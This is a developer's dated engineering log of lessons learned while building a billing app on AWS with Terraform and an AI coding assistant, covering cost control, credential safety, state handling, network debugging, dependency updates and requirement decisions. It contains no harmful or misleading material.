- **Why / what I learned:** A stopped server still pays for its disk, but not its hours. A cost question about cloud is usually a question about *hours running*, not *when you start*.
- **Say it in an interview:** "My cloud budget was zero, so I measured cost in running hours. I built the infrastructure early with Terraform, kept the server and database stopped except for work sessions and demos, and stayed around $10 a month of credits instead of $35."
- **Follow-ups to expect:** What still costs money when an EC2 instance is stopped? (Its EBS disk, and an Elastic IP if one is allocated. An auto-assigned public IP is released on stop.) What happens to RDS when stopped? (Storage is still charged, and AWS restarts it after 7 days, so a scheduled stop is needed.)

### 2026-11-12 — My AWS account wasn't the one my runbook described `#cloud` `#security` `#gotcha` → ADR 0030
- **What happened:** Checking stage 4 in the console, Claude found that the account came from AWS's new sign-up experience (announced 2026-09-16). I sign in with an identity provider into a "project". IAM has no users and says people get access through the Team page. There's no account-alias or user-group page. And the project is locked to **Sydney**: opening EC2 in Mumbai said "Your project is assigned to Asia Pacific (Sydney) … upgrade your plan first, and then activate advanced features." The runbook's steps C and D (root MFA, an IAM user in group `admins`, an alias) had nowhere to go. I chose Sydney and stayed on the Free plan. ADR 0030 replaces ADR 0029, and the runbook was rewritten.
- **Why / what I learned:** Cloud providers change their sign-up flow, and a runbook is only as current as the console it was written against. Check the real account before following the steps. The dangerous buttons were in plain sight ("Upgrade plan", "Activate advanced features"), and both are one-way doors.
- **Say it in an interview:** "When I opened the account, AWS's new onboarding locked my free project to Sydney. Getting Mumbai meant an irreversible upgrade to a paid plan. I kept the free plan, took the latency hit for a demo, and recorded the trade-off and when to reopen it."
- **Follow-ups to expect:** What latency does Sydney add from India? (Roughly 0.1–0.15 s per round trip, to measure in stage 5.) What about data residency? (Demo data only. Real shop data would need a Region decision first.)

### 2026-11-12 — A budget that stays at $0 while the credits drain `#cloud` `#cost` `#gotcha` → ADR 0030
- **What happened:** AWS Budgets counts credits as negative cost by default, so a normal "alert me at $5" budget never fires while the free credits pay for everything. In the console the switch has moved: it's no longer under Advanced options but under **Scope → Filter specific AWS cost dimensions → Charge type → Excludes → Credit, Refund**. Budget `monthly-credit-burn`: $15 a month, alerts at 33%, 66%, 100% actual and 100% forecast, by email. It's also one of the five $20 credit activities. The widget still said "Not started" right after creating it, so check again next session.
- **Why / what I learned:** An alert you never receive feels exactly like an alert you don't need. Test what a monitor measures, not only that it exists. On the Free plan budgets only warn: they can't stop a server (budget actions can, and the first two are free).
- **Say it in an interview:** "My cost alarm initially would have measured net cost, which is zero while credits pay, so it could never fire. I filtered out credits so it measures what the resources really cost."
- **Follow-ups to expect:** Actual vs forecasted alert? (Actual fires when spend crosses the line. Forecast fires early, when the month's projection will cross it.) Why $15? (About 1.5× the planned ~$10 a month, so it means "something is left running".)

### 2026-11-12 — Small gotchas in stage 4 `#cloud` `#gotcha` `#devops`
- **What happened:**
  - The console's web addresses carry the account ID (`<account-id>-<suffix>.<region>.console.aws.amazon.com`). Never paste one into a doc, an issue or a commit.
  - In the new experience the Region selector is gone. The only clue was a link pointing at `ap-southeast-2`, and opening a service in another Region showed the lock.
  - The "Earn AWS credits" list sits in a small inner scroll box on Console Home. It looks like 2 activities until you scroll inside it. There are 5.
  - The budget form's credit switch moved from *Advanced options* to *Scope → Filter specific AWS cost dimensions → Charge type*. The old place now only shows a note pointing to the new one.
  - The local gitleaks scan needs Docker Desktop running. With it off, the scan can't run, and the PR's `secrets` check is the safety net.
- **Why / what I learned:** consoles move things around. Read what's on the screen instead of following remembered clicks, and keep identifiers out of everything public.
- **Say it in an interview:** "AWS console URLs include the account ID, so screenshots and notes for a public repo need it removed."
- **Follow-ups to expect:** Is an account ID a secret? (Not on its own: AWS says it's an identifier, not a credential. Still, keeping it out of a public repo means less to target.)

### 2026-11-12 — Signing Terraform in without access keys: `aws login` `#cloud` `#security` `#devops` → ADR 0031
- **What happened:** The 2026-10-29 plan was `aws sso login` through IAM Identity Center, but my account's new projects-based experience has no Identity Center and no IAM users for people. AWS's own page for this experience documents `aws login --profile <name>`: it opens the browser, I pick my project and session, and the CLI gets credentials for an assumed role (`AccountFullAccessRole`), valid 12 hours and renewed for up to 90 days. Terraform's AWS provider reads that profile natively (provider ≥ 6.23, and the S3 backend from Terraform 1.15). I left out AWS's "Agent Toolkit" setup: it would also install an MCP server, skills and a second rule file next to `CLAUDE.md`, none of which Terraform needs.
- **Why / what I learned:** The goal stays the same whatever the sign-in flow is called: temporary credentials, nothing long-lived on disk, MFA on the identity. Read the provider's support for a new credential type before choosing it; older tools needed a `credential_process` wrapper.
- **Say it in an interview:** "There are no AWS access keys in my project. The CLI and Terraform use 12-hour credentials from my console sign-in, and CI will use OIDC with its own narrow role."
- **Follow-ups to expect:** What's the risk with your laptop session? (It's full access. Fine for one owner's laptop, never for CI. CI gets least privilege through OIDC.) What happens after 12 hours? (Commands fail with expired credentials; `aws login` again.)

### 2026-11-12 — A live key for another account was my laptop's default `#cloud` `#security` `#gotcha` → ADR 0031
- **What happened:** Before using Terraform, Claude looked at `~/.aws/`. A `credentials` file from April 2026 (written by the AWS Toolkit for VS Code) had two profiles with long-lived access keys, and `[default]` still worked: it was an IAM user from a different project, in another account, defaulting to `us-east-1`. Any `aws` command or Terraform run without a profile would have acted on that account, which isn't on a Free plan. Fix: every command names `--profile business-software`, and the Terraform provider gets `allowed_account_ids` (the ID in a git-ignored file), so it refuses any other account even with the wrong credentials. The OCR project is finished, so `[default]` was renamed to a named profile (now a command without a profile fails with `NoCredentials`). Deactivating the key from the laptop failed: the key's own user may not call `iam:UpdateAccessKey` (good least privilege), and the second profile's key was already invalid. So it gets deactivated in that account's console.
- **Why / what I learned:** Credentials outlive the projects they were made for. Tools silently fall back to `[default]`. A guard that checks *which account* you're in is cheap and catches the worst mistake in cloud work.
- **Say it in an interview:** "My Terraform provider pins the allowed account ID, so a wrong default profile makes it fail instead of building in the wrong account."
- **Follow-ups to expect:** What else could you do? (Delete or rotate unused keys; remove `[default]` so nothing works without a profile; `aws configure list` shows which credentials win and why.)

### 2026-11-12 — Priced it with the Pricing API before creating anything `#cloud` `#cost` → ADR 0032
- **What happened:** ADR 0011's estimate was Mumbai's. Claude queried the AWS Pricing API (`aws pricing get-products`, endpoint in `us-east-1`; it worked even though my project is locked to Sydney) for each line item. Sydney: EC2 `t4g.small` $0.0212/h, public IPv4 $0.005/h, RDS `db.t4g.micro` $0.025/h, EBS gp3 $0.096/GB-month, RDS gp3 $0.138/GB-month. That's **$0.0512 per running hour plus $4.73 a month** for disks: ≈ $42 a month at 24/7, ≈ $7.80 at 60 hours a month. I chose an auto-assigned IP (released while stopped) over an Elastic IP (billed even while stopped), a DuckDNS name the server updates at boot, Ubuntu 26.04 ARM64 (automatic security updates by default), and a nightly EventBridge Scheduler stop at 23:30 IST.
- **Why / what I learned:** Split cloud cost into "per running hour" and "per month regardless": stopping only removes the first part. An Elastic IP is a fixed-cost trap on a server that's mostly off.
- **Say it in an interview:** "I priced every resource with the Pricing API first. Running only for sessions and demos keeps the whole stack under $8 a month, and a nightly schedule stops it in case I forget."
- **Follow-ups to expect:** Why not `t4g.micro`? (Half the price, but 1 GB is tight for api + worker + Chromium; measure first.) What still costs while stopped? (Both disks: $4.73 a month.)

### 2026-11-12 — Measured: Sydney adds 0.2 s per round trip from India `#cloud` `#architecture` `#frontend` → ADR 0032
- **What happened:** ADR 0030 guessed 0.1–0.15 s. Claude timed TCP connections from my laptop to AWS's public endpoints, without DNS time: Mumbai ~55–80 ms, Sydney ~270–300 ms. That's about 0.2 s extra per round trip.
- **Why / what I learned:** Measure instead of guessing. NFR 5 wants a scanned item on screen in under 200 ms, which one Sydney round trip already uses up. So the billing screen (P1.13) must find items in a copy kept in the browser, not ask the server per scan.
- **Say it in an interview:** "Measuring latency to my Region showed one round trip already exceeded my 200 ms scan target, so the billing screen looks items up locally and only saving a bill goes to the server."
- **Follow-ups to expect:** How do you keep the browser's copy fresh? (Load the catalogue at start, refresh in the background, and let the server re-check prices and stock when the bill is saved.) Why does HTTPS make it worse? (A new connection needs TCP plus TLS handshakes first; keep-alive and HTTP/2 reuse one connection.)

### 2026-11-12 — Small gotchas installing the cloud tools `#devops` `#gotcha`
- **What happened:**
  - `winget install` changes PATH, but the open terminal keeps the old one: reload it or open a new terminal.
  - The old AWS CLI v1 had left launcher scripts in `Python311\Scripts` with no package behind them. CLI v2 lands earlier on PATH, so it wins (`Get-Command aws -All` shows the order).
  - Git Bash rewrites arguments that start with `/` into Windows paths, which mangled the SSM parameter name `/aws/service/...`. `MSYS_NO_PATHCONV=1` before the command stops it.
  - `winget` installed Terraform 1.17.1 while 1.17.2 was already out; Terraform itself says so on `terraform version`.
- **Why / what I learned:** on Windows, check *which* binary runs and what the shell did to your arguments before debugging the tool.
- **Say it in an interview:** "When a command behaves strangely on Windows, I check `Get-Command -All` for the binary and whether Git Bash rewrote a path argument."
- **Follow-ups to expect:** Why not install the CLI with pip? (v2 isn't on PyPI; v1 is old and needs a Python environment.)

### 2026-11-15 — Wrote the Terraform: a bootstrap root for state, one root for the demo `#cloud` `#devops` `#architecture`
- **What happened:** Stage 5 part 2 began. Two roots under `infra/terraform/`. `bootstrap/` makes only the S3 bucket for Terraform's state: versioned, encrypted, public access blocked, a policy refusing non-HTTPS requests, old versions deleted after 90 days. `demo/` makes the VPC (public subnets for the server, private ones with no route out for RDS), security groups, RDS PostgreSQL 18.6, the `t4g.small` server and two nightly stop schedules. The backend uses S3's own lock file (`use_lockfile`), so there's no DynamoDB table. `fmt` and `validate` pass; nothing has been applied.
- **Why / what I learned:** State is the map between my code and the real resources, so it's protected first. The bucket can't be stored in a bucket that doesn't exist yet: the bootstrap root applies with local state, then `init -migrate-state` moves that state into the bucket it created.
- **Say it in an interview:** "My Terraform state is in a versioned, encrypted S3 bucket with S3-native locking, created by a small bootstrap root whose own state is migrated into it."
- **Follow-ups to expect:** Why versioning? (A bad apply or a corrupted state can be rolled back.) Why two subnets for one database? (An RDS subnet group must cover two Availability Zones, even for Single-AZ.) Why no NAT gateway? (It bills by the hour, and nothing in the private subnets needs the internet.)

### 2026-11-15 — Proved the password stays out of state before writing the code `#security` `#cloud` `#devops`
- **What happened:** The plan depended on write-only arguments. Instead of trusting a blog post, Claude downloaded provider 6.73.0 and read its schema (`terraform providers schema -json`): `password_wo` on `aws_db_instance` and `value_wo` on `aws_ssm_parameter` are both marked write-only, and `random` 3.9.1 has an ephemeral `random_password`. The master password is generated during the run, sent to RDS and to an SSM SecureString, and stored in neither state nor plan. `db_password_version` tells Terraform when to send a new one.
- **Why / what I learned:** Ordinary Terraform arguments are saved in state in plain text, so anyone who can read the bucket reads the password. Write-only arguments (Terraform 1.11+) remove that. Check a feature in the tool's own schema; it takes a minute.
- **Say it in an interview:** "No password is in my Terraform state: it's an ephemeral value passed through write-only arguments, with a version number to rotate it."
- **Follow-ups to expect:** How do you rotate it? (Raise the version; RDS and SSM both get the new value in the same apply.) Why SSM and not Secrets Manager? (Standard parameters are free; Secrets Manager bills per secret.)

### 2026-11-15 — Four small settings that close a cost or security gap `#cloud` `#cost` `#security`
- **What happened:** While writing the server, four defaults turned out to be wrong for this project. (1) `t4g` instances default to `unlimited` CPU credits, which bills for CPU above the baseline; set to `standard`. (2) The metadata service is IMDSv2-only with hop limit 1, so containers can't fetch the instance's credentials. (3) Cloud-init runs only at first boot, so a changed file must replace the server (`user_data_replace_on_change`); safe because the server keeps no data. (4) The VPC's default security group is taken over with no rules, and the `web` group has no port 22: shell access is Session Manager.
- **Why / what I learned:** Defaults are chosen for convenience, not for a ₹0 budget or least privilege. Read each resource's defaults once.
- **Say it in an interview:** "My server has no SSH port and no key. I use Session Manager, IMDSv2 with hop limit 1, and standard CPU credits so a busy loop can't create a bill."
- **Follow-ups to expect:** What does hop limit 1 do? (The metadata reply can't cross the extra network hop into a container.) What breaks with `standard` credits? (The CPU is throttled to its baseline when credits run out; measure before a demo.)

### 2026-11-15 — `terraform init` failed: my network's IPv6 route to HashiCorp was broken `#devops` `#gotcha`
- **What happened:** `terraform init` failed with "An existing connection was forcibly closed by the remote host" while downloading providers. `curl -4` to `releases.hashicorp.com` returned 200 and `curl -6` failed, so only the IPv6 path was broken. Terraform has no "use IPv4" switch, and changing Windows' network settings wasn't worth it. Claude downloaded the provider zips with `curl -4`, checked each against HashiCorp's `SHA256SUMS`, and pointed Terraform at the folder with a `filesystem_mirror` block in a config file named by `TF_CLI_CONFIG_FILE`. `terraform providers lock -fs-mirror=… -platform=windows_amd64 -platform=linux_amd64` then wrote lock files that work on the laptop and in CI.
- **Why / what I learned:** Split a network failure by protocol before blaming the tool. The lock file records checksums per platform: a lock made on Windows alone fails on CI's Linux.
- **Say it in an interview:** "When provider downloads failed, I showed it was IPv6-only with `curl -4` and `-6`, installed from a checksum-verified local mirror, and locked the providers for both my laptop's and CI's platforms."
- **Follow-ups to expect:** Why commit `.terraform.lock.hcl`? (Everyone gets the same provider build, and a tampered download fails its checksum.)

### 2026-11-15 — Changing AWS accounts cost almost nothing, because nothing was clicked together `#cloud` `#process` `#devops`
- **What happened:** Signing in to my AWS project had become difficult, so I decided to open a new one. Claude listed everything tied to the old account: one budget in AWS, one profile on the laptop, and account facts in the docs. The Terraform files contain no account ID (the bucket name is built from whoever is signed in), no state existed, and GitHub knew nothing about AWS. The plan (`docs/plans/2026-11-15-aws-account-switch.md`): re-point the same profile name, read the new account's plan, credits and Region, **stop if it isn't on the Free plan**, set `allowed_account_ids` to the new ID, recreate the budget in Terraform this time, write ADR 0033.
- **Why / what I learned:** Infrastructure as code and "no account ID in the repo" made the account a parameter. The one hand-made resource, the budget, is the one that has to be redone by hand, so it moves into code. The Free plan is per customer, not per account, so a second account's plan must be checked before creating anything.
- **Say it in an interview:** "I moved the project to a new AWS account before the first apply. It took a sign-in and a doc update, because the infrastructure was code and the account was only a guarded parameter."
- **Follow-ups to expect:** And after the first apply? (Rebuild with Terraform, then move the data: snapshot or dump and restore, and change DNS.) How do you avoid building in the old account? (Named profile, `allowed_account_ids`, and checking `sts get-caller-identity` before each apply.)

### 2026-11-15 — Small gotchas in session 20 `#gotcha` `#git` `#devops`
- **What happened:**
  - I said the PR was merged; GitHub said `OPEN`. Claude checked `gh pr view 15 --json state` before switching to `main`, then merged it on my word.
  - `aws sts get-caller-identity` said "Your session has expired": `aws login` credentials last 12 hours. That's normal, not a broken account.
  - The Claude desktop app once showed `Script not found "stream-json"`. Its own Claude Code binary had started without its program (probably mid-update), and the Bun runtime inside it read a startup flag as a script name. Nothing in the repo caused it; restarting the app fixed it.
  - Prettier checks the cloud-init YAML too (`pnpm format:check`), but not `.tf` files: those need `terraform fmt`.
- **Why / what I learned:** Check the system of record (GitHub, `sts`) instead of memory, and read an error for which program is speaking before looking in my own code.
- **Say it in an interview:** "Before I build on a merge, I ask GitHub for the PR's state. I don't trust my memory of clicking the button."
- **Follow-ups to expect:** Why squash-merge? (One commit per task on `main`, with the PR title as its message.)

### 2026-11-17 — New AWS account: checked the plan before anything else, then moved to Mumbai `#cloud` `#cost` `#architecture` → ADR 0033
- **What happened:** I opened a new AWS account (the old one used "Sign in with Google", which kept failing). Before creating anything, Claude read it: `aws freetier get-account-plan-state` said **Free plan, $100 credits, ends 2027-05-17**; the account was empty. The old account had come from AWS's projects-based sign-up and was locked to Sydney; this one could use **Mumbai**. Same server type, PostgreSQL 18.6 and Ubuntu image there, **~0.06 s per round trip instead of ~0.30 s**, and cheaper ($0.0372 vs $0.0512 per running hour). I chose Mumbai. Four Terraform lines changed; `validate` still passed.
- **Why / what I learned:** Check the facts that decide cost and safety (the plan, the Region) with the account's own API before building. A decision made because of a constraint (Sydney, because the account was locked) should be revisited when the constraint goes away. Region was a variable in Terraform, so changing it was cheap.
- **Say it in an interview:** "Before the first apply I verified the account's plan through the Free Tier API, compared two Regions on price and measured latency from India, and moved to Mumbai: 5x lower latency for a billing screen and about 25% cheaper. Terraform made it a four-line change."
- **Follow-ups to expect:** Why does latency matter for billing? (A barcode scan should feel instant; NFR 5 is 200 ms.) Why not Mumbai from the start? (The old account was locked to Sydney unless I upgraded to the Paid plan.)

### 2026-11-17 — Root user vs an admin IAM user `#security` `#cloud`
- **What happened:** The CLI signed in as the account's **root** user, and root had **no MFA**. I turned on MFA for root (authenticator app) and planned an IAM user `admin` with `AdministratorAccess`, its own MFA and no access keys; `aws login` will run as that user.
- **Why / what I learned:** Root can do everything, including closing the account or upgrading the plan, and no IAM policy can restrict it. So it gets MFA and is kept for billing and emergencies. Daily work uses an IAM identity that can be restricted and audited. `aws login` gives short-lived credentials, so there are no long-lived keys to leak.
- **Say it in an interview:** "Root gets MFA and goes in a drawer. I work as an IAM user with MFA, the CLI uses 12-hour credentials from `aws login`, and there are no access keys at all."
- **Follow-ups to expect:** Why not IAM Identity Center? (Best for many people or accounts; for one person and one account an IAM user with MFA is simpler. It's an option later.) Is `AdministratorAccess` least privilege? (No; it's a deliberate shortcut for a one-person learning account, revisited at stage 10.)

### 2026-11-17 — Agent Toolkit for AWS, read-only `#ai` `#devops` `#cloud`
- **What happened:** Set up AWS's Agent Toolkit: `aws configure agent-toolkit` installed 25 AWS skills for Claude Code and an `aws-mcp` MCP server (a local proxy that signs requests to AWS's hosted MCP endpoint with my CLI credentials). I changed the generated entry: my named profile (it would have used `default`, another project's account), Region Mumbai, `--read-only`, a pinned version instead of `@latest`, telemetry off. AWS's rules file went into `docs/devops/aws-agent-rules.md`, imported from `CLAUDE.md`, under a section where this project's rules win (Terraform not CDK, SSM not Secrets Manager).
- **Why / what I learned:** An AI agent with cloud credentials is a new kind of actor, so it gets guardrails like any other: least privilege (read-only tools), a named profile, pinned dependencies, and changes only through reviewed Terraform. The toolkit itself costs nothing; calls it makes are billed normally.
- **Say it in an interview:** "My coding agent can search current AWS docs and read the account through MCP, but its AWS tools are read-only. Every change still goes through Terraform with a plan, a price and my approval."
- **Follow-ups to expect:** What is MCP? (Model Context Protocol: a standard way for an AI app to call tools, here AWS's.) How does it authenticate? (SigV4 signatures from the same `aws login` profile; CloudTrail records the calls with an MCP condition key.)

### 2026-11-17 — Two Windows gotchas behind "Failed to connect" `#gotcha` `#devops`
- **What happened:**
  - `uvx` failed with "An Application Control policy has blocked this file": Windows refused the small unsigned `.exe` launcher uv creates for a Python tool. Running the same package as a module (`uvx --from <pkg> python -m <module>`) works, because `python.exe` is signed.
  - The MCP proxy then failed with `-32602` / `httpx.ConnectError`. curl showed the endpoint works over IPv4 and fails over IPv6 at the TLS step on this network (the same cause as Terraform provider downloads failing in session 20). Making Windows prefer IPv4 (`netsh interface ipv6 set prefixpolicy ::ffff:0:0/96 60 4`, admin only) fixed ordinary programs but **not** the proxy: async httpx connects through anyio, which tries IPv6 first by itself. Proven with two tiny scripts (sync httpx OK; async fails by default, works when bound to IPv4). Fix: a 15-line wrapper outside the repo that limits the proxy's name lookups to IPv4.
- **Why / what I learned:** A vague error ("Invalid request parameters") hid a network error. Test each layer separately (DNS, TCP, TLS, sync client, async client) until one fails. The first netsh attempt silently didn't apply because the window wasn't an admin one: check the result, not the command.
- **Say it in an interview:** "I narrowed a connection failure layer by layer and found that my network breaks IPv6 TLS, and that the async HTTP library ignores the OS's address preference. I scoped the fix to that one process instead of changing more of the system."
- **Follow-ups to expect:** What is happy eyeballs? (RFC 8305: try IPv6 and IPv4 in parallel and use whichever connects first. It doesn't help here because the IPv6 TCP connection succeeds and only TLS fails.) The real fix? (IPv6 on the router or ISP; then remove the wrapper.)

### 2026-11-17 — First apply: guardrails as code, and Terraform state's chicken and egg `#devops` `#cloud` `#cost` → ADR 0033
- **What happened:** The first `terraform apply` in the new account created 8 resources: the $15 budget (now Terraform, not hand-made) and the S3 bucket for Terraform's state (versioned, encrypted, public access blocked, HTTPS only, old versions expire after 90 days). Cost ≈ $0. Before planning, `sts get-caller-identity` confirmed the IAM user in the new account, and `allowed_account_ids` (from a git-ignored file) made Terraform refuse any other account. After the apply, the bootstrap root's backend block was switched on and `terraform init -migrate-state` moved its state into the bucket it had just created; a `plan` afterwards said "No changes".
- **Why / what I learned:** Terraform keeps state (what it built) in a backend; the bucket for that state can't hold the state of its own creation, so the bootstrap root starts with local state and migrates once the bucket exists. A guardrail made by hand has to be remembered and redone in every new account; as code, it comes with one apply.
- **Say it in an interview:** "My first apply in AWS built the guardrails before any server: the account lock, the budget and an encrypted, versioned state bucket. Then I migrated the bootstrap's own state into that bucket and checked that a plan showed no changes."
- **Follow-ups to expect:** How do you stop two applies at once? (`use_lockfile = true`: S3 keeps a lock file next to the state; no DynamoDB table since Terraform 1.10.) What if the state is lost or corrupted? (Versioning keeps every previous state file; `prevent_destroy` guards the bucket.)

### 2026-11-17 — Ten days instead of two months, without cutting scope or checks `#process` `#git`
- **What happened:** About 45–50 tasks were left, estimated at 60–75 one-task sessions. I asked to finish in 7–10 days with the same output and the same quality bar. The new plan (`docs/plans/2026-11-17-fast-track.md`) keeps every task and every check. It changes how the work flows: up to four tasks run in parallel, each in its own git worktree, branch and PR. All open requirement questions are answered in three evening sittings. The day's plans are approved together each morning. Anything that needs outside approval (WhatsApp test number, AI key, email domain) starts on Day 1.
- **Why / what I learned:** Most of the time went to waiting, not building: one task after another, a plan per task waiting for an OK, and questions asked only when a module came up. To work in parallel safely, I drew the dependency graph to find the critical path (signup → login and items → stock → saving a bill → printing, returns, udhaar). Then I scheduled so no two lanes change the same table's schema on the same day. I also kept one merge queue: GitHub requires each PR to be up to date with `main`, so after every merge the next branch rebases, regenerates its Drizzle migration and runs the checks again. Migrations therefore land in order and are never edited once on `main`. The plan keeps a buffer day, because a schedule with no slack slips on the first surprise.
- **Say it in an interview:** "To go faster I parallelised the work, not the quality. I mapped dependencies to find the critical path, ran independent tasks side by side in separate worktrees, and serialised only the merges, with a rule that two branches never change the same table on the same day. Every PR still had tests first, an independent review and five green CI checks."
- **Follow-ups to expect:** How do you stop two parallel branches from creating clashing migrations? (Generate the migration only after rebasing onto the latest `main`, merge one PR at a time, and CI's `migrations` check refuses a migration older than `main`'s.) What would you cut if the deadline couldn't move? (Scope, explicitly agreed with the owner, never tests or reviews.)

### 2026-11-17 — Dependency refresh: minors only, and audit fixes without forcing majors `#devops` `#security` `#gotcha`
- **What happened:** `pnpm up -r` took every minor and patch update inside the existing version ranges, except typescript-eslint, which I held back on purpose (below): NestJS 12.3 → 12.5, Vite 8.3.5 → 8.3.8, Vitest 5.0 → 5.1 (through the pnpm catalog), ESLint 10.13 → 10.15, Prettier 3.9 → 3.10, TanStack Query and Router plugin, Tailwind, lucide-react, i18next 26.5 → 26.7 and a few more. `pnpm audit` had flagged development tools only. ESLint 10.15 fixed its own `minimatch`. Three more needed a narrow pnpm override in `pnpm-workspace.yaml`, each under one parent and with a comment saying why: `glob` 10 → 14 under Testcontainers' `archiver-utils` (latest release still asks for glob 10), `esbuild` 0.18 → 0.25 under drizzle-kit's abandoned `@esbuild-kit` loader, and `minimatch` 10 → 11 under typescript-eslint. typescript-eslint itself stayed on 8.72: 8.73 adds a new strict lint rule (`no-unsafe-class-instance-assignment`) that flags the way NestJS takes its options, so it gets its own task instead of being switched off. One advisory is left: `picomatch` (ReDoS, high), with no fixed release published yet, and only in dev tools; `pnpm audit --prod` is clean. Format, lint, typecheck, build and all 272 tests (Testcontainers included) passed.
- **Why / what I learned:** A minor or patch release promises no breaking changes, so many can go in one PR and the tests are the proof. A major can break things on purpose, so each one (`i18next` 27, `react-i18next` 18, `jsdom` 31, TypeScript 7, `@types/node` 26) waits for a task that reads its change notes. TypeScript stays on `~6.0` because typescript-eslint supports only versions below 6.1, and Drizzle stays on 0.45 because 1.0 is still a release candidate. A pnpm override replaces one package deep in the tree; scoping it to one parent (`parent>child`) keeps the change small and easy to remove later. Even a "minor" update can turn the lint red when a preset gains a rule, which is why the full check runs after every refresh.
- **Say it in an interview:** "I refresh dependencies in small, separate PRs: minor and patch updates together, each major on its own. For audit findings I first look for a parent release that fixes them. If there isn't one, I add a scoped override with a comment saying when to remove it. When nobody has shipped a fix yet, I write that down instead of hiding the warning. A one-day release-age rule means we never install a version in its first 24 hours."
- **Follow-ups to expect:** Why not just run `pnpm audit --fix`? (It adds overrides for everything, unscoped and without reasons. I want each one small, explained and easy to remove.) Are dev-tool advisories worth fixing? (Less urgent than production ones, since they never ship to users, but a compromised build tool runs on the developer's machine and in CI, so I fix them when a safe fix exists.)

### 2026-11-17 — The Free plan capped my database backups at less than 7 days `#cloud` `#database` `#gotcha` → ADR 0011
- **What happened:** The first `terraform apply` of the demo stack failed on RDS with `FreeTierRestrictionError: The specified backup retention period exceeds the maximum available to free tier customers. To remove all limitations, upgrade your account plan.` AWS's docs list 0–35 days and don't mention a Free plan cap. Upgrading is ruled out (ADR 0033), so I set retention to 1 day, the API's own default.
- **Why / what I learned:** Point-in-time restore replays the database's change log onto a daily snapshot, so it can only go back as far as the retention period. With 1 day I can still undo a mistake from the last hour to within about 5 minutes, but anything older must come from my own nightly `pg_dump` to S3 (stage 7). That copy has gone from "a second copy" to "the only copy of history", so its restore drill matters more. Time while the database is stopped doesn't count toward retention.
- **Say it in an interview:** "My cloud plan capped automated backups at one day. Instead of paying to lift the limit, I kept point-in-time restore for recent mistakes and made my nightly logical dump to S3 the long-term copy, with a restore drill to prove it works."
- **Follow-ups to expect:** What's the difference between RPO and retention? (RPO is how much recent data you can lose, about 5 minutes with PITR; retention is how far back you can go, now 1 day for PITR and 90 days for the S3 dumps.)

### 2026-11-17 — A failed apply left my database and its password copy with different passwords `#cloud` `#security` `#mistake` `#gotcha`
- **What happened:** The database's master password is an ephemeral random value, sent write-only both to RDS and to an SSM parameter, so it never lands in Terraform state. The first apply wrote the SSM parameter, then failed on RDS. The second apply made a **new** random password for RDS, but didn't rewrite SSM, because SSM's version number hadn't changed. The step 7 check caught it: logging in with the password from SSM gave `password authentication failed`.
- **Why / what I learned:** An ephemeral value is new on every run, so two resources that must hold the same value can drift apart when they're created in different runs. Fix: raise `db_password_version` to send one new password to both, and add `depends_on` so SSM is written only after RDS accepts the password. That closes the case I hit (RDS failing first), but not every case: if SSM failed after RDS succeeded, the retry would send a new password to SSM only. So the runbook has a recovery rule: after any failed apply that touched either one, start RDS, raise the version again and prove it with a real login. Also, AWS applies a master password change at once, without an outage, whatever `apply_immediately` says (ModifyDBInstance docs).
- **Say it in an interview:** "A partial apply taught me that write-only secrets need ordering and a recovery rule. Terraform can't compare a value it never stored, so I write the database first and its copy second, and after any failure I rotate both and verify with a real login, not just a green apply."
- **Follow-ups to expect:** Why not just store the password in state? (State is read by anyone with access to the bucket and by every plan; write-only arguments keep it out entirely. I checked: the password appears 0 times in `terraform state pull`.)

### 2026-11-17 — Small gotchas on the first demo apply `#cloud` `#devops` `#gotcha`
- **What happened:**
  - A security group rule description with an apostrophe ("Let's Encrypt") was refused. AWS allows only `a-zA-Z0-9. _-:/()#,@[]+=&;{}!$*` and spaces there.
  - RDS PostgreSQL 15 and later sets `rds.force_ssl = 1` by default. I read it from the account's `postgres18` defaults, and a connection with `sslmode=disable` was refused (`no pg_hba.conf entry … no encryption`), so no parameter group was needed.
  - I ran the server checks with Systems Manager Run Command (`send-command` + `get-command-invocation`), not SSH: no key, port 22 closed, and every command is recorded.
  - CI now runs `terraform validate` with `init -backend=false -lockfile=readonly`. The committed lock file must hold Linux hashes too, so I proved the step in a `hashicorp/terraform` Linux container before pushing.
- **Say it in an interview:** "I verify infrastructure from the inside: architecture, swap, IMDSv2, a real TLS login to the database, and that the database refuses plain-text connections and is unreachable from the internet."

### 2026-11-17 — Sixteen requirement questions settled in one sitting `#requirements` `#gst` `#process`
- **What happened:** Sitting 1 of the fast track settled Module 01's four open questions and finalized Modules 02 (Billing & GST) and 03 (Udhaar) in about half an hour. Claude brought a recommended answer with a reason for every question; I took the recommendations and confirmed the draft ideas plus ten additions that cover edge cases. Two early decisions came with it: no paid domain (email stays in Amazon SES's sandbox, and the printed recovery key is the reset path for demo visitors), and Claude Sonnet 5.5 with a $15 monthly cap for the assistant.
- **Why / what I learned:**
  - **Medical profit uses the batch actually sold.** The old rule ("oldest stock first") clashed with selling the batch that expires soonest.
  - **Moving stock to a branch in another state is a taxable supply under GST,** because branches with different GSTINs are "distinct persons". The app makes an IGST invoice and a matching purchase entry.
  - **A saved bill is never edited:** a mistake is cancelled with a reason, or fixed with a credit note.
  - **Udhaar payments clear the oldest bills first,** so the overdue buckets stay right.
  - **E-invoicing is left out on purpose** (compulsory only above ₹5 crore turnover), but bills keep every field it needs.
- **Say it in an interview:** "I batched every open requirement into short decision sittings with a recommended answer for each, so building never waited on a question. I also treated GST rules as requirements, not code details: an inter-state branch transfer is a taxable supply, so the app raises an IGST invoice."
- **Follow-ups to expect:** Why not let users edit a saved bill? (Invoices are legal documents with numbers that must not have gaps or silent changes; a cancel with a reason, or a credit note, keeps the history.) Why Sonnet and not Opus? (It costs half as much as Opus; the eval set will show whether its accuracy is enough, and changing the model is one line.)

### 2026-11-17 — A fresh review caught rules nobody chose inside decided requirements `#requirements` `#process` `#mistake` `#ai`
- **What happened:** Before merging sitting 1's requirement files, a reviewer with no memory of the chat compared each file with my exact answers. It found 5 important and 8 minor problems. Three are worth remembering: "cheque (number and date)" added a rule I never chose; one task note said both "no domain" and "SES needs a verified domain"; and the AI decision record said Sonnet 5.5 can't turn its thinking off, when the API reference says `thinking: {type: "between_tools"}` does (only `{type: "disabled"}` is refused). It also spotted a schedule clash: branch transfers (Day 5) need purchase entries, which arrive on Day 7.
- **Why / what I learned:**
  - **Small words become rules.** A decided requirement is what gets built, so an extra bracket is scope nobody approved. Anything Claude adds is labelled as an addition and confirmed.
  - **When one decision changes, search for every place that repeats the old version,** not only the file you edited.
  - **Check API facts against the current reference,** even ones written down the same day.
